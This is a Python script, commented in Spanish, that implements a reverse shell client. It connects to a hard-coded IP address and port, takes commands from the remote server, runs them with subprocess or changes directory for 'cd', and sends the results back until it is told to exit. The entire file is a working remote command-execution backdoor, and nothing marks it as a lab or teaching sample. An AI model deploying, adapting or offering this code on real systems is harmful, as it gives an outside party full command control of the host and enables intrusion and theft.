import socket
import subprocess
import os

# Configuración de la conexión
ip = '192.168.12.103'   # Dirección IP del servidor
port = 45000            # Puerto utilizado para la conexión
buffer_size = 2048      # Tamaño del búfer para la recepción de datos

# Creación del socket y conexión al servidor
s = socket.socket()
s.connect((ip, port))

# Recibir y mostrar el mensaje de bienvenida del servidor
print(s.recv(buffer_size).decode())

# Bucle principal para la interacción con el servidor
while True:
    # Recibir comando del servidor
    command = s.recv(buffer_size).decode()

    # Salir del bucle si el comando es 'exit'
    if command == 'exit':
        break

    # Ejecutar comando 'cd' para cambiar de directorio
    if command.startswith('cd'):
        try:
            # Extraer el directorio del comando y cambiar al directorio especificado
            directory = command.split(' ')[1].strip()
            os.chdir(directory)
            # Enviar mensaje de confirmación al servidor
            s.send(f'Directorio cambiado a {os.getcwd()}\n'.encode())
        except Exception as e:
            # Enviar mensaje de error al servidor si no se puede cambiar de directorio
            s.send(f'Error al cambiar de directorio: {str(e)}\n'.encode())
    else:
        try:
            # Ejecutar cualquier otro comando y obtener la salida
            output = subprocess.getoutput(command)
            # Enviar la salida al servidor
            s.send(output.encode())
        except Exception as e:
            # Enviar mensaje de error al servidor si no se puede ejecutar el comando
            s.send(f'Error al ejecutar el comando: {str(e)}\n'.encode())
# Cerrar la conexión
s.close()

